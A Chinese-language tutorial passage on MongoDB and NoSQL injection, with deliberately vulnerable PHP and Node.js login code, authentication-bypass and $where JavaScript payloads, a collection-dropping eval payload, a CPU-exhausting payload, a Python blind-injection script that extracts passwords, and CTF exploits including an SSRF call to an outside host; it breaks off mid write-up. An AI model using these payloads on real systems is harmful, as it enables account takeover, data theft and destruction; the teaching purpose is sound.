![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b30f41603a9615f859103a4c896d36cb52d499d9.jpg)

\[toc\]

什么是 Nosql
---------

NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。在现代的计算系统上每天网络上都会产生庞大的数据量。这些数据有很大一部分是由关系数据库管理系统（RDBMS）来处理。 通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术。

NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。

什么是 MongoDB
-----------

MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。

MongoDB 将数据存储为一个文档，数据结构由键值（key=&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。

```sql
{
    "_id" : ObjectId("60fa854cf8aaaf4f21049148"),
    "name" : "whoami",
    "description" : "the admin user",
    "age" : 19,
    "status" : "A",
    "groups" : [
        "admins",
        "users"
    ]
}
```

### MongoDB 基础概念解析

不管我们学习什么数据库都应该学习其中的基础概念，在 MongoDB 中基本的概念有文档、集合、数据库，如下表所示：

| SQL 概念 | MongoDB 概念 | 说明 |
|---|---|---|
| database | database | 数据库 |
| table | collection | 数据库表/集合 |
| row | document | 数据记录行/文档 |
| column | field | 数据字段/域 |
| index | index | 索引 |
| table joins |  | 表连接，MongoDB 不支持 |
| primary key | primary key | 主键，MongoDB 自动将 `_id` 字段设置为主键 |

下表列出了关系型数据库 RDBMS 与 MongoDB 之间对应的术语：

| RDBMS | MongoDB |
|---|---|
| 数据库 | 数据库 |
| 表格 | 集合 |
| 行 | 文档 |
| 列 | 字段 |
| 表联合 | 嵌入文档 |
| 主键 | 主键（MongoDB 提供了 key 为 \_id） |

#### 数据库（Database）

个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。

使用 `show dbs` 命令可以显示所有数据库的列表：

```sql
$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
> show dbs
admin   0.078GB
config  0.078GB
local   0.078GB
> 
```

执行 `db` 命令可以显示当前数据库对象或集合：

```sql
$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
> db
test
> 
```

#### 文档（Document）

文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。

一个简单的文档例子如下：

```json
{"name":"whoami", "age":19}
```

#### 集合（Collection）

集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。

比如，我们可以将以下不同数据结构的文档插入到集合中：

```json
{"name":"whoami"}
{"name":"bunny", "age":19}
{"name":"bob", "age":20, "groups":["admins","users"]}
```

当插入一个文档时，集合就会被自动创建。

如果我们要查看已有集合，可以使用 `show collections` 或 `show tables` 命令：

```sql
> show collections
all_users
> show tables
all_users
> 
```

### MongoDB 基础语法解析

#### MongoDB 创建数据库

MongoDB 创建数据库的语法格式如下：

```sql
use DATABASE_NAME
```

如果数据库不存在，则创建数据库，否则切连接并换到指定数据库，是不是很方便！

以下实例我们创建了数据库 love:

```sql
> use users
switched to db users
> db
users
> 
```

#### MongoDB 创建集合

MongoDB 中我们使用 `createCollection()` 方法来创建集合。其语法格式如下：

```sql
db.createCollection(name, options)
```

参数说明：

- name：要创建的集合名称
- options：可选参数，指定有关内存大小及索引的选项

如下实例，我们在 users 数据库中创建一个 all\_users 集合：

```sql
> use users
switched to db users
> db.createCollection("all_users")
{ "ok" : 1 }
>
```

#### MongoDB 插入文档

在 MongoDB 中我们可以使用 `insert()` 方法向集合中插入文档，语法如下：

```sql
db.COLLECTION_NAME.insert(document)
```

如下实例，我们向存储在 users 数据库的 all\_users 集合中插入一个文档：

```json
> db.all_users.insert({name: 'whoami', 
    description: 'the admin user',
    age: 19,
    status: 'A',
    groups: ['admins', 'users']
})
```

我们也可以将文档数据定义为一个变量，然后再执行插入操作将变量插入。

#### MongoDB 更新文档

在 MongoDB 中我们可以使用 `update()` 或 `save()` 方法来更新集合中的文档。

- **update() 方法**

update() 方法用于更新已存在的文档。语法格式如下：

```sql
db.collection.update(
   <query>,
   <update>,
   {
     upsert: <boolean>,
     multi: <boolean>,
     writeConcern: <document>
   }
)
```

参数说明：

- query：update 操作的查询条件，类似 sql update 语句中 where 子句后面的内容。
- update：update 操作的对象和一些更新的操作符（如 `$set`）等，可以理解为 sql update 语句中 set 关键字后面的内容。
- multi：可选，默认是 false，只更新找到的第一条记录，如果这个参数为 true，就把按条件查出来多条记录全部更新。

接着我们通过 update() 方法来将年龄 age 从 19 更新到 20：

```sql
> db.lover.update({'age':19}, {$set:{'age':20}})
WriteResult({ "nMatched" : 0, "nUpserted" : 0, "nModified" : 0 })
>
> db.all_users.find().pretty()
{
    "_id" : ObjectId("60fa854cf8aaaf4f21049148"),
    "name" : "whoami",
    "description" : "the admin user",
    "age" : 20,
    "status" : "A",
    "groups" : [
        "admins",
        "users"
    ]
}
> 
```

成功将 age 从 19 改为了 20。

以上语句只会修改第一条发现的文档，如果你要修改多条相同的文档，则需要设置 multi 参数为 true。

```sql
> db.lover.update({'age':'19'}, {$set:{'age':20}}, {multi:true})
```

- **save() 方法**

save() 方法通过传入的文档来替换已有文档，`_id` 主键存在就更新，不存在就插入。语法格式如下：

```sql
db.collection.save(
   <document>,
   {
     writeConcern: <document>
   }
)
```

参数说明：

- document：文档数据。

如下实例中我们替换了 `_id` 为 60fa854cf8aaaf4f21049148 的文档数据：

```sql
> db.all_users.save({
    "_id" : ObjectId("60fa854cf8aaaf4f21049148"),
    "name" : "whoami",
    "description" : "the admin user",
    "age" : 21,
    "status" : "A",
    "groups" : [
        "admins",
        "users"
    ]
})
```

#### MongoDB 查询文档

在 MongoDB 中我们可以使用 `find()` 方法来查询文档。`find()` 方法以非结构化的方式来显示所有文档。其语法格式如下：

```sql
db.collection.find(query, projection)
```

参数说明：

- query：可选，使用查询操作符指定查询条件，相当于 sql select 语句中的 where 子句。
- projection：可选，使用投影操作符指定返回的键。

如下实例我们查询了集合 all\_users 中的 age 为 20 的数据：

```sql
> db.all_users.find({"age":"20"})
{ "_id" : ObjectId("60fa854cf8aaaf4f21049148"), "name" : "whoami", "description" : "the admin user", "age" : "20", "status" : "A", "groups" : [ "admins", "users" ] }
>
```

如果你需要以易读的方式来读取数据，可以使用 `pretty()` 方法以格式化的方式来显示所有文档：

```sql
> db.all_users.find({"age":20}).pretty()
{
    "_id" : ObjectId("60fa854cf8aaaf4f21049148"),
    "name" : "whoami",
    "description" : "the admin user",
    "age" : 20,
    "status" : "A",
    "groups" : [
        "admins",
        "users"
    ]
}
> 
```

#### MongoDB 与 RDBMS Where 语句的比较

如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：

| 操作 | 格式 | 范例 | RDBMS 中的类似语句 |
|---|---|---|---|
| 等于 | `{<key>:<value>}` | `db.love.find({"name":"whoami"}).pretty()` | `where name = 'whoami'` |
| 小于 | `{<key>:{$lt:<value>}}` | `db.love.find({"age":{$lt:19}}).pretty()` | `where age < 19` |
| 小于或等于 | `{<key>:{$lte:<value>}}` | `db.love.find({"age":{$lte:19}}).pretty()` | `where likes <= 19` |
| 大于 | `{<key>:{$gt:<value>}}` | `db.love.find({"age":{$gt:19}}).pretty()` | `where likes > 19` |
| 大于或等于 | `{<key>:{$gte:<value>}}` | `db.love.find({"age":{$gte:19}}).pretty()` | `where likes >= 19` |
| 不等于 | `{<key>:{$ne:<value>}}` | `db.love.find({"age":{$ne:19}}).pretty()` | `where likes != 19` |

#### MongoDB AND 条件

MongoDB 中的 `find()` 方法可以传入多个键值对，每个键值对以逗号隔开，即常规 SQL 的 AND 条件。语法格式如下：

```sql
> db.all_users.find({"status":"B", "age":20})
{ "_id" : ObjectId("60fa8ef8f8aaaf4f2104914e"), "name" : "bob", "description" : "the normal user", "age" : 20, "status" : "B", "groups" : [ "normals", "users" ] }
> 
```

以上实例中类似于 RDBMS 中的 WHERE 语句：`WHERE status='B' AND age=20`

#### MongoDB OR 条件

MongoDB OR 条件语句使用了关键字 `$or` 来表示，语法格式如下：

```sql
> db.col.find(
   {
      $or: [
         {key1: value1}, {key2:value2}
      ]
   }
).pretty()
```

如下实例，我们查询键 `status` 值为 A 或键 `age` 值为 19 的文档。

```sql
> db.all_users.find({$or:[{"status":"A", "age":"19"}]})
{ "_id" : ObjectId("60fa8ec6f8aaaf4f2104914c"), "name" : "bunny", "description" : "the normal user", "age" : 19, "status" : "A", "groups" : [ "lovers", "users" ] }
> 
```

#### AND 和 OR 联合使用

以下实例演示了 AND 和 OR 联合使用，类似于 RDBMS 中的 WHERE 语句： `where age>19 AND (name='whoami' OR status='A')`

```sql
> db.all_users.find({"age":{$gt:19}, $or: [{"name":"whoami"}, {"status":"A"}]})
{ "_id" : ObjectId("60fa9176f8aaaf4f21049150"), "name" : "whoami", "description" : "the admin user", "age" : 20, "status" : "A", "groups" : [ "admins", "users" ] }
> 
```

Nosql 注入的简介
-----------

NoSQL 注入由于 NoSQL 本身的特性和传统的 SQL 注入有所区别。使用传统的SQL注入，攻击者利用不安全的用户输入来修改或替换应用程序发送到数据库引擎的 SQL 查询语句（或其他SQL语句）。  
换句话说，SQL 注入使攻击者可以在数据库中 SQL 执行命令。

与关系数据库不同，NoSQL 数据库不使用通用查询语言。NoSQL 查询语法是特定于产品的，查询是使用应用程序的编程语言编写的：PHP，JavaScript，Python，Java 等。这意味着成功的注入使攻击者不仅可以在数据库中执行命令，而且可以在应用程序本身中执行命令，这可能更加危险。

以下是 OWASP 对于 Nosql 注入的介绍：

> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren’t using the traditional SQL syntax. Because these NoSQL injection attacks may execute within a [procedural language](https://en.wikipedia.org/wiki/Procedural_programming), rather than in the [declarative SQL language](https://en.wikipedia.org/wiki/Declarative_programming), the potential impacts are greater than traditional SQL injection.
> 
> NoSQL database calls are written in the application’s programming language, a custom API call, or formatted according to a common convention (such as `XML`, `JSON`, `LINQ`, etc). Malicious input targeting those specifications may not trigger the primarily application sanitization checks. For example, filtering out common HTML special characters such as `< > & ;` will not prevent attacks against a JSON API, where special characters include `/ { } :`.

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-af2338ca02a16d6fb9a25633eb673870769f9f74.jpg)

NoSQL 注入的分类
-----------

有两种 NoSQL 注入分类的方式：

第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。

第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。

- **重言式注入**

又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。

- **联合查询注入**

联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。

- **JavaScript 注入**

MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。

- **盲注**

当页面没有回显时，那么我们可以通过 `$regex` 正则表达式来达到和传统 SQL 注入中 `substr()` 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。

下面我们便通过 PHP 和 Nodejs 来讲解 MongoDB 注入的利用方式。

PHP 中的 MongoDB 注入
-----------------

**测试环境如下：**

- Ubuntu
- PHP 7.4.21
- MongoDB Server 4.4.7

在 PHP 中使用 MongoDB 你必须使用 MongoDB 的 PHP 驱动：<https://pecl.php.net/package/mongodb> 。这里我们使用新版的 PHP 驱动来操作 MongoDB。一下实例均以 POST 请求方式为例。

### 重言式注入

首先在 MongoDB 中选中 test 数据库，创建一个 users 集合并插入文档数据：

```sql
> use test
switched to db test
>
> db.createCollection('users')
{ "ok" : 1 }
>
> db.users.insert({username: 'admin', password: '123456'})
WriteResult({ "nInserted" : 1 })
> db.users.insert({username: 'whoami', password: '657260'})
WriteResult({ "nInserted" : 1 })
> db.users.insert({username: 'bunny', password: '964795'})
WriteResult({ "nInserted" : 1 })
> db.users.insert({username: 'bob', password: '965379'})
WriteResult({ "nInserted" : 1 })
> 
```

然后编写 index.php：

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];

$query = new MongoDB\Driver\Query(array(
    'username' => $username,
    'password' => $password
));

$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count > 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====<br>';
        echo 'username:' . $user['username'] . '<br>';
        echo 'password:' . $user['password'] . '<br>';
    }
}
else{
    echo 'Login Failed';
}
?>
```

如下，当正常用户想要登陆 whoami 用户时，POST 方法提交的数据如下：

```php
username=whoami&password=657260
```

进入 PHP 后的程序数据如下：

```php
array(
    'username' => 'whoami',
    'password' => '657260'
)
```

进入 MongoDB 后执行的查询命令为：

```sql
> db.users.find({'username':'whoami', 'password':'657260'})
{ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
```

我们从代码中可以看出，这里对用户输入没有做任何过滤与校验，那么我们可以通过 `$ne` 关键字构造一个永真的条件就可以完成 NoSQL 注入：

```php
username[$ne]=1&password[$ne]=1
```

如下图所示，成功查出所有的用户信息，说明成功注入了一个永真查询条件：

![image-20210724003600838](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ae725c97a83f21148e3f440acdf91357747a6111.png)

提交的数据进入 PHP 后的数据如下：

```php
array(
    'username' => array('$ne' => 1),
    'password' => array('$ne' => 1)
)
```

进入 MongoDB 后执行的查询命令为：

```sql
> db.users.find({'username':{$ne:1}, 'password':{$ne:1}})
{ "_id" : ObjectId("60fa9c7b257f18542b68c4b8"), "username" : "admin", "password" : "123456" }
{ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
{ "_id" : ObjectId("60fa9c85257f18542b68c4ba"), "username" : "bunny", "password" : "964795" }
{ "_id" : ObjectId("60fa9c88257f18542b68c4bb"), "username" : "bob", "password" : "965379" }
```

由于 users 集合中 username 和 password 都不等于 1，所以将所有的文档数据查出，这很可能是真实的，并且可能允许攻击者绕过身份验证。

对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们发送 `value=1` 那么，也就是发送了一个 `value` 的值为 1 的数据。如果发送 `value[$ne]=1` 则 PHP 会将其转换为数组 `value=array($ne=>1)`，当数据到了进入 MongoDB 后，原来一个单一的 `{"value":1}` 查询就变成了一个 `{"value":{$ne:1}` 条件查询。同样的，我们也可以使用下面这些作为 payload 进行攻击：

```php
username[$ne]=&password[$ne]=
username[$gt]=&password[$gt]=
username[$gte]=&password[$gte]=
```

这种重言式注入的方式也是我们通常用来验证网站是否存在 NoSQL 注入的第一步。

### 联合查询注入

在 MongoDB 之类的流行数据存储中，JSON 查询结构使得联合查询注入攻击变得比较复杂了，但也是可以实现的。

我们都知道，直接对 SQL 查询语句进行字符拼接串容易造成 SQL 注入，NoSQL 也有类似问题。如下实例，假设后端的 MongoDB 查询语句使用了字符串拼接：

```php
string query = "{ username: '" + $username + "', password: '" + $password + "' }"
```

当用户正确的用户名密码进行登录时，得到的查询语句是应该这样的：

```json
{'username':'admin', 'password':'123456'}
```

如果此时没有很好地对用户的输入进行过滤或者效验，那攻击者便可以构造如下 payload：

```php
username=admin', $or: [ {}, {'a': 'a&password=' }], $comment: '123456
```

拼接入查询语句后相当于执行了：

```json
{ username: 'admin', $or: [ {}, {'a':'a', password: '' }], $comment: '123456'}
```

此时，只要用户名是正确的，这个查询就可以成功。这种手法和 SQL 注入比较相似：

```sql
select * from logins where username = 'admin' and (password true<> or ('a'='a' and password = ''))
```

这样，原本正常的查询语句会被转换为忽略密码的，在无需密码的情况下直接登录用户账号，因为 `()` 内的条件总是永真的。

但是现在无论是 PHP 的 MongoDB Driver 还是 Nodejs 的 Mongoose 都必须要求查询条件必须是一个数组或者 Query 对象了，因此这用注入方法简单了解一下就好了。

### JavaScript 注入

MongoDB Server 是支持 JavaScript 的，可以使用 JavaScript 进行一些复杂事务和查询，也允许在查询的时候执行 JavaScript 代码。但是如果传递不干净的用户输入到这些查询中，则可能会注入任意的 JavaScript 代码，导致非法的数据获取或篡改。

#### $where 操作符

首先我们需要了解一下 `$where` 操作符。在 MongoDB 中，`$where` 操作符可以用来执行 JavaScript 代码，将 JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分。在 MongoDB 2.4 之前，通过 `$where` 操作符使用 `map-reduce`、`group` 命令甚至可以访问到 Mongo Shell 中的全局函数和属性，如 `db`，也就是说可以在自定义的函数里获取数据库的所有信息。

如下实例：

```sql
> db.users.find({ $where: "function(){return(this.username == 'whoami')}" })
{ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
> 
```

由于使用了 `$where` 关键字，其后面的 JavaScript 将会被执行并返回 "whoami"，然后将查询出 username 为 whoami 的数据。

某些易受攻击的 PHP 应用程序在构建 MongoDB 查询时可能会直接插入未经过处理的用户输入，例如从变量中 `$userData` 获取查询条件：

```sql
db.users.find({ $where: "function(){return(this.username == $userData)}" })
```

然后，攻击者可能会注入一种恶意的字符串如 `'a'; sleep(5000)` ，此时 MongoDB 执行的查询语句为：

```sql
db.users.find({ $where: "function(){return(this.username == 'a'; sleep(5000))}" })
```

如果此时服务器有 5 秒钟的延迟则说明注入成功。

下面我们编写 index.php 进行测试：

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];
$function = "
function() { 
    var username = '".$username."';
    var password = '".$password."';
    if(username == 'admin' && password == '123456'){
        return true;
    }else{
        return false;
    }
}";
$query = new MongoDB\Driver\Query(array(
    '$where' => $function
));
$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count>0) {
    foreach ($result as $user) {
        $user=(array)$user;
        echo '====Login Success====<br>';
        echo 'username: '.$user['username']."<br>";
        echo 'password: '.$user['password']."<br>";
    }
}
else{
    echo 'Login Failed';
}
?>
```

- **MongoDB 2.4 之前**

在 MongoDB 2.4 之前，通过 `$where` 操作符使用 `map-reduce`、`group` 命令可以访问到 Mongo Shell 中的全局函数和属性，如 `db`，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息。

如下所示，发送以下数据后，如果有回显的话将获取当前数据库下所有的集合名：

```php
username=1&password=1';(function(){return(tojson(db.getCollectionNames()))})();var a='1
```

- **MongoDB 2.4 之后**

MongoDB 2.4 之后 `db` 属性访问不到了，但我们应然可以构造万能密码。如果此时我们发送以下这几种数据：

```php
username=1&password=1';return true//
或
username=1&password=1';return true;var a='1
```

如下图所示，成功查出所有的用户信息：

![image-20210724003629252](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-677054aebccbcde6814a6fa46e549364518f8938.png)

这是因为发送 payload 进入 PHP 后的数据如下：

```php
array(
    '$where' => "
    function() { 
        var username = '1';
        var password = '1';return true;var a='1';
        if(username == 'admin' && password == '123456'){
            return true;
        }else{
            return false;
        }
    }
")
```

进入 MongoDB 后执行的查询命令为：

```sql
> db.users.find({$where: "function() { var username = '1';var password = '1';return true;var a='1';if(username == 'admin' && password == '123456'){ return true; }else{ return false; }}"})
{ "_id" : ObjectId("60fa9c7b257f18542b68c4b8"), "username" : "admin", "password" : "123456" }
{ "_id" : ObjectId("60fa9c80257f18542b68c4b9"), "username" : "whoami", "password" : "657260" }
{ "_id" : ObjectId("60fa9c85257f18542b68c4ba"), "username" : "bunny", "password" : "964795" }
{ "_id" : ObjectId("60fa9c88257f18542b68c4bb"), "username" : "bob", "password" : "965379" }
> 
```

我们从代码中可以看出，password 中的 `return true` 使得整个 JavaScript 代码提前结束并返回了 `true`，这样就构造出了一个永真的条件并完成了 NoSQL 注入。

此外还有一个类似于 DOS 攻击的 payload，可以让服务器 CPU 飙升到 100% 持续 5 秒：

```javascript
username=1&password=1';(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return Math.max();})();var a='1
```

#### 使用 Command 方法造成的注入

MongoDB Driver 一般都提供直接执行 Shell 命令的方法，这些方式一般是不推荐使用的，但难免有人为了实现一些复杂的查询去使用。在 MongoDB 的服务器端可以通过 `db.eval` 方法来执行 JavaScript 脚本，如我们可以定义一个 JavaScript 函数，然后通过 `db.eval` 在服务器端来运行。

但是在 PHP 官网中就已经友情提醒了不要这样使用：

```php
<?php
$m = new MongoDB\Driver\Manager;

// Don't do this!!!
$username = $_GET['field'];
// $username is set to "'); db.users.drop(); print('"

$cmd = new \MongoDB\Driver\Command( [
'eval' => "print('Hello, $username!');"
] );

$r = $m->executeCommand( 'dramio', $cmd );
?>
```

还有人喜欢用 Command 去实现 MongoDB 的 `distinct` 方法，如下：

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];

$cmd = new MongoDB\Driver\Command( [
    'eval' => "db.users.distinct('username',{'username':'$username'})"
] );

$result = $manager->executeCommand('test.users', $cmd)->toArray();
$count = count($result);
if ($count > 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====<br>';
        echo 'username:' . $user['username'] . '<br>';
        echo 'password:' . $user['password'] . '<br>';
    }
}
else{
    echo 'Login Failed';
}
?>
```

这样都是很危险的，因为这个就相当于把 Mongo Shell 开放给了用户，如果此时构造下列 payload：

```php
username=1'});db.users.drop();db.user.find({'username':'1
username=1'});db.users.insert({"username":"admin","password":123456"});db.users.find({'username':'1
```

则将改变原本的查询语句造成注入。如果当前应用连接数据库的权限恰好很高，我们能干的事情就更多了。

### 布尔盲注

当页面没有回显时，那么我们可以通过 `$regex` 正则表达式来进行盲注， `$regex` 可以达到和传统 SQL 注入中 `substr()` 函数相同的功能。

我们还是利用第一个 index.php 进行演示：

```php
<?php
$manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
$username = $_POST['username'];
$password = $_POST['password'];

$query = new MongoDB\Driver\Query(array(
    'username' => $username,
    'password' => $password
));

$result = $manager->executeQuery('test.users', $query)->toArray();
$count = count($result);
if ($count > 0) {
    foreach ($result as $user) {
        $user = ((array)$user);
        echo '====Login Success====<br>';
        echo 'username:' . $user['username'] . '<br>';
        echo 'password:' . $user['password'] . '<br>';
    }
}
else{
    echo 'Login Failed';
}
?>
```

布尔盲注重点在于怎么逐个提取字符，如下所示，在已知一个用户名的情况下判断密码的长度：

```php
username=admin&password[$regex]=.{4}    // 登录成功
username=admin&password[$regex]=.{5}    // 登录成功
username=admin&password[$regex]=.{6}    // 登录成功
username=admin&password[$regex]=.{7}    // 登录失败
......
```

![image-20210724010106365](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-65159ecfa44db68a5a839a0a21d8e881abe0b0e0.png)

![image-20210724010125065](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-bd532ee6dc7d946d0b04a857f274a6b3a88dc433.png)

在 `password[$regex]=.{6}` 时可以成功登录，但在 `password[$regex]=.{7}` 时登录失败，说明该 whoami 用户的密码长度为 7。

提交的数据进入 PHP 后的数据如下：

```php
array(
    'username' => 'admin',
    'password' => array('$regex' => '.{6}')
)
```

进入 MongoDB 后执行的查询命令为：

```sql
> db.users.find({'username':'admin', 'password':{$regex:'.{6}'}})
{ "_id" : ObjectId("60fa9c7b257f18542b68c4b8"), "username" : "admin", "password" : "123456" }
> db.users.find({'username':'admin', 'password':{$regex:'.{7}'}})
>
```

由于 whoami 用户的 password 长度为 6，所以查询条件 `{'username':'admin', 'password':{$regex:'.{6}'}}` 为真，便能成功登录，而 `{'username':'admin', 'password':{$regex:'.{7}'}}` 为假，自然也就登录不了。

知道 password 的长度之后我们便可以逐位提取 password 的字符了：

```javascript
username=admin&password[$regex]=1.{5}
username=admin&password[$regex]=12.{4}
username=admin&password[$regex]=123.{3}
username=admin&password[$regex]=1234.{2}
username=admin&password[$regex]=12345.*
username=admin&password[$regex]=123456
或
username=admin&password[$regex]=^1
username=admin&password[$regex]=^12
username=admin&password[$regex]=^123
username=admin&password[$regex]=^1234
username=admin&password[$regex]=^12345
username=admin&password[$regex]=^123456
```

下面给出一个 MongoDB 盲注脚本：

```python
import requests
import string

password = ''
url = 'http://192.168.226.148/index.php'

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:

            # When the method is GET
            get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
            # When the method is POST
            post_payload = {
                "username": "admin",
                "password[$regex]": '^' + password + c
            }
            # When the method is POST with JSON
            json_payload = """{"username":"admin", "password":{"$regex":"^%s"}}""" % (password + c)
            #headers = {'Content-Type': 'application/json'}
            #r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json

            r = requests.post(url=url, data=post_payload)
            if 'Login Success' in r.text:
                print("[+] %s" % (password + c))
                password += c

# 输出如下: 
# [+] 1
# [+] 12
# [+] 123
# [+] 1234
# [+] 12345
# [+] 123456
```

Nodejs 中的 MongoDB 注入
--------------------

在 Nodejs 中也存在 MongoDB 注入的问题，其中主要是重言式注入，通过构造永真式构造万能密码实现登录绕过。下面我们使用 Nodejs 中的 mongoose 模块操作 MongoDB 进行演示。

- server.js

```js
var express = require('express');
var mongoose = require('mongoose');
var jade = require('jade');
var bodyParser = require('body-parser');

mongoose.connect('mongodb://localhost/test', { useNewUrlParser: true });
var UserSchema = new mongoose.Schema({
    name: String,
    username: String,
    password: String
});
var User = mongoose.model('users', UserSchema);
var app = express();

app.set('views', __dirname);
app.set('view engine', 'jade');

app.get('/', function(req, res) {
    res.render ("index.jade",{
        message: 'Please Login'
    });
});

app.use(bodyParser.json());

app.post('/', function(req, res) {
    console.log(req.body)
    User.findOne({username: req.body.username, password: req.body.password}, function (err, user) {
        console.log(user)
        if (err) {
            return res.render('index.jade', {message: err.message});
        }
        if (!user) {
            return res.render('index.jade', {message: 'Login Failed'});
        }

        return res.render('index.jade', {message: 'Welcome back ' + user.name + '!'});
    });
});

var server = app.listen(8000, '0.0.0.0', function () {

    var host = server.address().address
    var port = server.address().port

    console.log("listening on http://%s:%s", host, port)
});
```

- index.jade

```php
h1 #{message}
p #{message}
```

运行 server.js 后，访问 8000 端口：

由于后端解析 JSON，所以我们发送 JSON 格式的 payload：

```json
{"username":{"$ne":1},"password": {"$ne":1}}
```

![image-20210724015724378](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0d56fc689a83cbd0393f658343d357db6cb39e33.png)

如上图所示，成功登录。

在处理 MongoDB 查询时，经常会使用 JSON格式将用户提交的数据发送到服务端，如果目标过滤了 `$ne` 等关键字，我们可以使用 Unicode 编码绕过，因为 JSON 可以直接解析 Unicode。如下所示：

```json
{"username":{"\u0024\u006e\u0065":1},"password": {"\u0024\u006e\u0065":1}}
// {"username":{"$ne":1},"password": {"$ne":1}}
```

![image-20210724020055910](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-92ebeaac9f87d3e1672aa8e5a9540b68643eae3f.png)

Nosql 相关 CTF 例题
---------------

### \[2021 MRCTF\]Half-Nosqli

进入题目，发现是一个Swagger UI：

![image-20210417184733150](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e28727fb6ecb759e09686c9dff3baf68e26bb69c.png)

有两个 Api 接口，一个是 `/login` 用于登录，另一个是 `/home` 可通过 url 属性进行 SSRF。我们可以编写脚本来访问这两个 Api 接口。首先访问 `/home`接口报错，因为需要验证，所以思路应该是先访问 `/login` 接口进行登录，登录后拿到 token 再去访问 `/home` 接口。这里由于题目名提示了是 NoSQL，所以我们可以直接使用 NoSQL 的永真式绕过。

这里没有任何过滤，Exp 如下：

```python
import requests
import json

url = "http://node.mrctf.fun:23000/"
json_data = {
  "email": {"$ne": ""},
  "password": {"$ne": ""}
}
res = requests.post(url=url+'login',json=json_data)
token = res.json()['token']

json_data2 = {
    "url":"http://47.xxx.xxx.72:4000"    # 通过这里的url值进行SSRF
}

headers = {
    "Authorization":"Bearer "+token
}
res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
print(res2)
```

这样我们便可以通过 `/home` 接口的 url 值进行SSRF了：

![image-20210417185827448](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-02ff6881da27d4f2dc8a9d2e36ac00992052bb18.png)

接下来是一个 HTTP 拆分攻击，详情请看：[\[2021 MRCTF\]Half-Nosqli](https://whoamianony.top/2021/04/20/Web%E5%AE%89%E5%85%A8/HTTP%E5%93%8D%E5%BA%94%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB%EF%BC%88CRLF%20Injection%EF%BC%89/#2021-MRCTF-Half-Nosqli)

### \[GKCTF 2021\]hackme

进入题目，是一个登录框：

![image-20210724160137101](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d6a5ea327d988bfeccb7592c6acbf2c9691855f9.png)

查看源码发现如下提示：

```html
<!--doyounosql?-->
```

应该是 nosql 注入，随机登录抓包发现解析 json：

